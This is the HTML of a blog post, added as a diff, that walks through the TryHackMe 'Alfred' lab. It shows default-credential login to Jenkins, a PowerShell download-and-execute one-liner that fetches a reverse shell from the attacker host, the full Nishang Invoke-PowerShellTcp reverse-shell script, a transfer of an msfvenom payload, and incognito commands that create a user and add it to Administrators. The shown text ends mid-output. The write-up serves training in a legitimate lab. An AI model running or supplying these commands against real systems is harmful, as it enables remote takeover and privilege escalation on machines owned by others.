@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="AlfredDifficulty: EasyScore: 3&#x2F;10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM Alfred">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[4].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="AlfredDifficulty: EasyScore: 3&#x2F;10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpZGEmTC1Wq3Mf86BCuDAW4psPi0.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FphM2QdEqLw4HF6Uaa3zhj1kj2YH.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqo-un_gDflKbfH01hHIKGIqk4RA.png">
+<meta property="article:published_time" content="2022-01-20T21:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.206Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Penetration Test">
+<meta property="article:tag" content="Try Hack Me">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpZGEmTC1Wq3Mf86BCuDAW4psPi0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>THM Alfred</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B6%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B3%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[4].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&text=THM Alfred"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&is_video=false&description=THM Alfred"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM Alfred&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[4].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&name=THM Alfred&description=&lt;h1 id=&#34;Alfred&#34;&gt;&lt;a href=&#34;#Alfred&#34; class=&#34;headerlink&#34; title=&#34;Alfred&#34;&gt;&lt;/a&gt;Alfred&lt;/h1&gt;&lt;p&gt;Difficulty: Easy&lt;br&gt;Score: 3&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[4].html&t=THM Alfred"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Alfred"><span class="toc-number">1.</span> <span class="toc-text">Alfred</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">3.1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Delivery"><span class="toc-number">3.2.</span> <span class="toc-text">Delivery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SeDebugPrivileg"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">SeDebugPrivileg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeCreateGlobalPrivilege"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">SeCreateGlobalPrivilege</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-and-Command"><span class="toc-number">3.4.</span> <span class="toc-text">Control and Command</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">3.4.0.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Use-metasploit-to-listen-on-the-port"><span class="toc-number">3.4.0.2.</span> <span class="toc-text">Use metasploit to listen on the port</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-2"><span class="toc-number">3.4.0.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Smb-server-transfer-exe-file"><span class="toc-number">3.4.0.4.</span> <span class="toc-text">Smb server transfer exe file</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post"><span class="toc-number">3.5.</span> <span class="toc-text">Post</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        THM Alfred
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-20T21:18:00.000Z" class="dt-published" itemprop="datePublished">2022-01-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>, <a class="p-category" href="/tags/Try-Hack-Me/" rel="tag">Try Hack Me</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h1><p>Difficulty: Easy<br>Score: 3&#x2F;10</p>
+<hr>
+<span id="more"></span>
+
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
+<li>2 flags</li>
+<li>system priveledge</li>
+</ol>
+<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We found 3 port is opened. They are 80, 3389, 8080.<br>The 8080 port<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpZGEmTC1Wq3Mf86BCuDAW4psPi0.png"><br>Username:Password → admin:admin (Easy guess it)<br>We found it can execute Windows command directly!<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FphM2QdEqLw4HF6Uaa3zhj1kj2YH.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd -<span class="token operator">></span> Powershell
+powershell iex <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'http://10.11.61.17:80/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-PowerShellTcp <span class="token parameter variable">-Reverse</span> <span class="token parameter variable">-IPAddress</span> <span class="token number">10.11</span>.61.17 <span class="token parameter variable">-Port</span> <span class="token number">4445</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h2><p>Powershell_reverse_shell</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">function</span> <span class="token function">Invoke-PowerShellTcp</span>
+<span class="token punctuation">&#123;</span>
+<span class="token comment">&lt;#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
+Also, a standard netcat can connect to this script Bind to a specific port.
+The script is derived from Powerfun written by Ben Turner &amp; Dave Hardy
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
+the given IP and port.
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port.
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#></span>
+    <span class="token punctuation">[</span>CmdletBinding<span class="token punctuation">(</span>DefaultParameterSetName=<span class="token string">"reverse"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">Param</span><span class="token punctuation">(</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>Position = 0<span class="token punctuation">,</span> Mandatory = <span class="token boolean">$true</span><span class="token punctuation">,</span> ParameterSetName=<span class="token string">"reverse"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>Position = 0<span class="token punctuation">,</span> Mandatory = <span class="token boolean">$false</span><span class="token punctuation">,</span> ParameterSetName=<span class="token string">"bind"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token namespace">[String]</span>
+        <span class="token variable">$IPAddress</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>Position = 1<span class="token punctuation">,</span> Mandatory = <span class="token boolean">$true</span><span class="token punctuation">,</span> ParameterSetName=<span class="token string">"reverse"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>Position = 1<span class="token punctuation">,</span> Mandatory = <span class="token boolean">$true</span><span class="token punctuation">,</span> ParameterSetName=<span class="token string">"bind"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token namespace">[Int]</span>
+        <span class="token variable">$Port</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName=<span class="token string">"reverse"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token namespace">[Switch]</span>
+        <span class="token variable">$Reverse</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName=<span class="token string">"bind"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token namespace">[Switch]</span>
+        <span class="token variable">$Bind</span>
+    <span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token comment">#Connect back if the reverse switch is used.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Reverse</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$client</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token variable">$IPAddress</span><span class="token punctuation">,</span><span class="token variable">$Port</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment">#Bind to the provided port if Bind switch is used.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Bind</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$listener</span> = <span class="token namespace">[System.Net.Sockets.TcpListener]</span><span class="token variable">$Port</span>
+            <span class="token variable">$listener</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token variable">$client</span> = <span class="token variable">$listener</span><span class="token punctuation">.</span>AcceptTcpClient<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token namespace">[byte[]]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>0<span class="token punctuation">&#125;</span>
+        <span class="token comment">#Send back current username and computername</span>
+        <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">"Windows PowerShell running as user "</span> <span class="token operator">+</span> <span class="token variable">$env</span>:username <span class="token operator">+</span> <span class="token string">" on "</span> <span class="token operator">+</span> <span class="token variable">$env</span>:computername <span class="token operator">+</span> <span class="token string">"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"</span><span class="token punctuation">)</span>
+        <span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span>
+        <span class="token comment">#Show an interactive PowerShell prompt</span>
+        <span class="token variable">$sendbytes</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token string">'PS '</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">Get-Location</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">'>'</span><span class="token punctuation">)</span>
+        <span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$EncodedText</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding
+            <span class="token variable">$data</span> = <span class="token variable">$EncodedText</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span>
+            <span class="token keyword">try</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token comment">#Execute the command on the target.</span>
+                <span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">Invoke-Expression</span> <span class="token operator">-</span>Command <span class="token variable">$data</span> 2>&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">catch</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token function">Write-Warning</span> <span class="token string">"Something went wrong with execution of command on the target."</span>
+                <span class="token function">Write-Error</span> <span class="token variable">$_</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token variable">$sendback2</span>  = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">'PS '</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">Get-Location</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">'> '</span>
+            <span class="token variable">$x</span> = <span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token punctuation">|</span> <span class="token function">Out-String</span><span class="token punctuation">)</span>
+            <span class="token variable">$error</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token variable">$sendback2</span> = <span class="token variable">$sendback2</span> <span class="token operator">+</span> <span class="token variable">$x</span>
+            <span class="token comment">#Return the results</span>
+            <span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span>
+            <span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span>
+            <span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$listener</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$listener</span><span class="token punctuation">.</span>Stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">catch</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">Write-Warning</span> <span class="token string">"Something went wrong! Check if the server is reachable and you are using the correct port."</span>
+        <span class="token function">Write-Error</span> <span class="token variable">$_</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>input command whoami &#x2F;priv</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>\Jenkins\workspace\project>whoami <span class="token operator">/</span>priv
+PRIVILEGES INFORMATION
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeDebugPrivilege                Debug programs                            Enabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="SeDebugPrivileg"><a href="#SeDebugPrivileg" class="headerlink" title="SeDebugPrivileg"></a>SeDebugPrivileg</h4><p>SeDebugPrivilege <strong>allows a process to inspect and adjust the memory of other processes</strong>, and has long been a security concern.** SeDebugPrivilege allows the token bearer to access any process or thread**, regardless of security descriptors.</p>
+<h4 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h4><p>The “<strong>Impersonate a client after authentication” user right</strong> (SeImpersonatePrivilege) is a Windows 2000 security setting that was first introduced in Windows 2000 SP4. … The following components also have this user right: Services that are started by the Service Control Manager</p>
+<h4 id="SeCreateGlobalPrivilege"><a href="#SeCreateGlobalPrivilege" class="headerlink" title="SeCreateGlobalPrivilege"></a>SeCreateGlobalPrivilege</h4><p>The “Create global objects” user right (SeCreateGlobalPrivilege) is <strong>a Windows 2000 security setting</strong> that was first introduced in Windows 2000 SP4. The user right is required for a <strong>user account to create global objects</strong> in a Terminal Services session.</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Control-and-Command"><a href="#Control-and-Command" class="headerlink" title="Control and Command"></a>Control and Command</h2><p>Use nc listen the 4445 port.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4445</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Use the powershell to download the binary file (Msfvenom → shell)</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell <span class="token string">"(New-Object System.Net.WebClient).Downloadfile('http://&lt;ip>:8000/shell-name.exe','shell-name.exe')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="Use-metasploit-to-listen-on-the-port"><a href="#Use-metasploit-to-listen-on-the-port" class="headerlink" title="Use metasploit to listen on the port"></a>Use metasploit to listen on the port</h4><p>Execute the shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Start-Process <span class="token string">"shell-name.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><h4 id="Smb-server-transfer-exe-file"><a href="#Smb-server-transfer-exe-file" class="headerlink" title="Smb server transfer exe file"></a>Smb server transfer exe file</h4><p>We will exploit SeImpersonatePrivilege and SeDebugPrivilege with the help of incognito <a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Hacker:
+python3 smbserver.py sharefolder <span class="token builtin class-name">.</span>
+Target:
+copy <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.11</span>.14.106<span class="token punctuation">\</span>smbfolder<span class="token punctuation">\</span>incognito.exe   // It will download the exe <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now with incognito we can just create a user and add it to local administrators group:</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\windows\temp> <span class="token punctuation">.</span><span class="token operator">/</span>incognito<span class="token punctuation">.</span>exe add_user writeup I_hope_you_like_it
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> WARNING: Not running as SYSTEM<span class="token punctuation">.</span> Not all tokens will be available<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Enumerating tokens
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Attempting to add user writeup to host 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Successfully added user
+<span class="token function">PS</span> C:\windows\temp> <span class="token punctuation">.</span><span class="token operator">/</span>incognito<span class="token punctuation">.</span>exe add_localgroup_user Administrators writeup
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> WARNING: Not running as SYSTEM<span class="token punctuation">.</span> Not all tokens will be available<span class="token punctuation">.</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Enumerating tokens
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Attempting to add user writeup to local <span class="token function">group</span> Administrators on host 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1
